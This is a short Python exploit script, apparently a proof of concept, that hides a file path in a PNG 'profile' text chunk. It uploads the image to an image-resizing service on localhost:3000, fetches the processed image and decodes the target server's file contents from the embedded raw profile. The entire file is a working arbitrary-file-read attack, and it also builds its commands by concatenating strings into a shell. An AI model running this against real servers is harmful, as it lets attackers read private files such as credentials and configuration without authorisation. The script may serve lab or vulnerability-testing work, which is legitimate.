#!/usr/bin/env python3
import subprocess
import sys
import time
import os

def execute_command(command):
    # print("Executing: "+command)
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()
    return stdout.decode()

def decode_png(png_file = os.getcwd()+"/result.png"):
    print("Decoding content from "+png_file+"...\n")
    command = "docker run --rm -it -v "+png_file+":/result.png node identify -verbose /result.png"

    image_data = execute_command(command)
    lines = image_data.split("\n")

    start_raw_data = ["Raw profile type:" in line for line in lines].index(True) + 3
    end_raw_data = lines[start_raw_data:].index("\r") + start_raw_data
    raw_data_str = "".join(lines[start_raw_data:end_raw_data])
    decoded_str = bytes.fromhex(raw_data_str).decode("utf-8")
    return decoded_str


if len(sys.argv) > 1:
    print("Encoding "+sys.argv[1]+" into k8s.png as pngout.png...")
    execute_command("pngcrush -text a \"profile\" \""+sys.argv[1]+"\" k8s.png")

    print("Sending pngout.png to localhost:3000...")
    execute_command("curl localhost:3000/upload -F 'file=@pngout.png' --compressed")
    time.sleep(3)

    print("Finding processed image and downloading as result.png...")
    image_number=execute_command("curl -s localhost:3000/images | grep resized | sed \"s/.*resized-image-\(.*\)\.png.*/\\1/\"").strip()
    print("Downloading resized-image-"+image_number+".png as result.png")
    execute_command("curl -s localhost:3000/uploads/resized-image-"+image_number+".png -o result.png")

else:
    print("No command passed, will use existing result.png file")

print(decode_png())
